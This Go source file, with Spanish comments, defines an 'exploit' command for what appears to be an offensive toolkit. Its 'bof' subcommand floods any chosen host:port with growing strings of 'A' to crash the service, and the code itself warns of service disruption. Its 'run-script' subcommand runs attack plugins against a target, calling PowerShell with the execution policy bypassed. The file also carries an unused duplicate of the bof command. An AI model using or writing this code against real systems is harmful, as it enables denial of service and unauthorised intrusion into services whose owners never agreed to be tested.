// FICHERO: explotar.go (VERSIÓN CON ESTRUCTURA DE COMANDOS CORREGIDA)
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// NewExploitCmd crea el comando padre 'exploit'.
func NewExploitCmd() *cobra.Command {
	// 1. Definir el comando padre.
	cmd := &cobra.Command{
		Use:   "exploit",
		Short: "Ejecuta módulos de explotación y scripts externos",
		Long:  `Contiene una colección de herramientas de ataque, incluyendo tests de PoC y un sistema para ejecutar plugins externos.`,
	}

	// 2. Definir los subcomandos.
	var targetBOF, pluginName, targetScript string
	var maxSize, step int

	bofCmd := &cobra.Command{
		Use:   "bof",
		Short: "Realiza un test simple de Buffer Overflow (BOF)",
		Long:  `ADVERTENCIA: POTENCIALMENTE DESTRUCTIVO...`,
		Run: func(cmd *cobra.Command, args []string) {
			if targetBOF == "" { log.Fatal("Error: Se requiere un objetivo con el formato host:puerto (--target)") }
			runBofTest(targetBOF, maxSize, step)
		},
	}
	bofCmd.Flags().StringVarP(&targetBOF, "target", "t", "", "Objetivo a atacar (formato: host:puerto)")
	bofCmd.Flags().IntVar(&maxSize, "max-size", 5000, "Tamaño máximo del buffer a enviar")
	bofCmd.Flags().IntVar(&step, "step", 100, "Incremento del tamaño del buffer en cada intento")

	runScriptCmd := &cobra.Command{
		Use:   "run-script",
		Short: "Ejecuta un plugin de script externo desde la carpeta 'plugins'",
		Long:  `Busca un script en la carpeta 'plugins' y lo ejecuta pasándole el objetivo a través de variables de entorno.`,
		Run: func(cmd *cobra.Command, args []string) {
			if pluginName == "" || targetScript == "" { log.Fatal("Error: Se requiere un nombre de plugin (--plugin) y un objetivo (--target).") }
			runScriptPlugin(pluginName, targetScript)
		},
	}
	runScriptCmd.Flags().StringVarP(&pluginName, "plugin", "p", "", "Nombre del plugin a ejecutar (ej. recon/test)")
	runScriptCmd.Flags().StringVarP(&targetScript, "target", "t", "", "Objetivo para el script (IP, URL, etc.)")

	// 3. Añadir los subcomandos al comando padre.
	cmd.AddCommand(bofCmd, runScriptCmd)

	return cmd
}


// --- Lógica de las Funciones (sin cambios) ---

// runBofTest contiene la lógica para el ataque de desbordamiento de búfer.
func runBofTest(target string, maxSize, step int) {
	log.Println("--- INICIANDO TEST DE BUFFER OVERFLOW ---")
	log.Printf("Objetivo: %s", target)
	log.Println("¡¡¡ADVERTENCIA!!! Esto puede causar la interrupción del servicio.")
	for size := step; size <= maxSize; size += step {
		fmt.Printf("Enviando buffer de %d bytes... ", size)
		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err != nil { log.Fatalf("\nError: No se pudo conectar al objetivo. ¿El servicio se ha caído? Causa: %v", err) }
		payload := strings.Repeat("A", size)
		conn.Write([]byte(payload + "\r\n"))
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		response := make([]byte, 1024)
		_, err = conn.Read(response)
		if err != nil { fmt.Println("No se recibió respuesta o la conexión se cerró. ¡Posible crash!")
		} else { fmt.Println("Servicio respondió. Probablemente no vulnerable a este tamaño.") }
		conn.Close()
		time.Sleep(500 * time.Millisecond)
	}
	log.Println("--- TEST DE BUFFER OVERFLOW COMPLETADO ---")
}

// runScriptPlugin contiene la lógica para encontrar y ejecutar un script.
func runScriptPlugin(pluginName, target string) {
	exePath, err := os.Executable()
	if err != nil { log.Fatalf("Error crítico: No se pudo encontrar la ruta del ejecutable: %v", err) }
	exeDir := filepath.Dir(exePath)
	pluginPath := filepath.Join(exeDir, "plugins", pluginName)

	if runtime.GOOS == "windows" {
		if _, err := os.Stat(pluginPath + ".bat"); err == nil { pluginPath += ".bat"
		} else if _, err := os.Stat(pluginPath + ".ps1"); err == nil { pluginPath += ".ps1"
		} else { log.Fatalf("Error: No se encontró el plugin '%s.bat' o '%s.ps1'.", pluginPath, pluginPath) }
	} else {
		pluginPath += ".sh"
		if _, err := os.Stat(pluginPath); os.IsNotExist(err) { log.Fatalf("Error: No se encontró el plugin '%s': %v", pluginPath, err) }
	}
	
	log.Printf("Ejecutando plugin: %s", pluginPath)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" && strings.HasSuffix(pluginPath, ".ps1") {
		cmd = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", pluginPath)
	} else {
		cmd = exec.Command(pluginPath)
	}

	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, fmt.Sprintf("SYNAPSE_TARGET=%s", target))
	
	host, port, err := net.SplitHostPort(target)
	if err == nil {
		cmd.Env = append(cmd.Env, fmt.Sprintf("SYNAPSE_HOST=%s", host))
		cmd.Env = append(cmd.Env, fmt.Sprintf("SYNAPSE_PORT=%s", port))
	} else {
		cmd.Env = append(cmd.Env, fmt.Sprintf("SYNAPSE_HOST=%s", target))
	}

	output, err := cmd.CombinedOutput()
	if err != nil { log.Printf("El plugin terminó con un error: %v", err) }

	fmt.Println("--- SALIDA DEL PLUGIN ---")
	fmt.Println(string(output))
	fmt.Println("-------------------------")
}

// newBofCmd crea el subcomando 'exploit bof'.
func newBofCmd() *cobra.Command {
	var target string
	var maxSize int
	var step int

	cmd := &cobra.Command{
		Use:   "bof",
		Short: "Realiza un test simple de Buffer Overflow (BOF)",
		Long: `ADVERTENCIA: POTENCIALMENTE DESTRUCTIVO.
Esta herramienta se conecta a un servicio y envía cadenas de caracteres ('A') 
cada vez más largas para comprobar si se produce un crash por desbordamiento de búfer.`,
		Run: func(cmd *cobra.Command, args []string) {
			if target == "" {
				log.Fatal("Error: Se requiere un objetivo con el formato host:puerto (-t)")
			}
			runBofTest(target, maxSize, step)
		},
	}

	cmd.Flags().StringVarP(&target, "target", "t", "", "Objetivo a atacar (formato: host:puerto)")
	cmd.Flags().IntVarP(&maxSize, "max-size", "m", 5000, "Tamaño máximo del buffer a enviar")
	cmd.Flags().IntVarP(&step, "step", "s", 100, "Incremento del tamaño del buffer en cada intento")
	cmd.MarkFlagRequired("target") // Hacemos que el flag de objetivo sea obligatorio.

	return cmd
}

// (Eliminado el duplicado de la función runBofTest)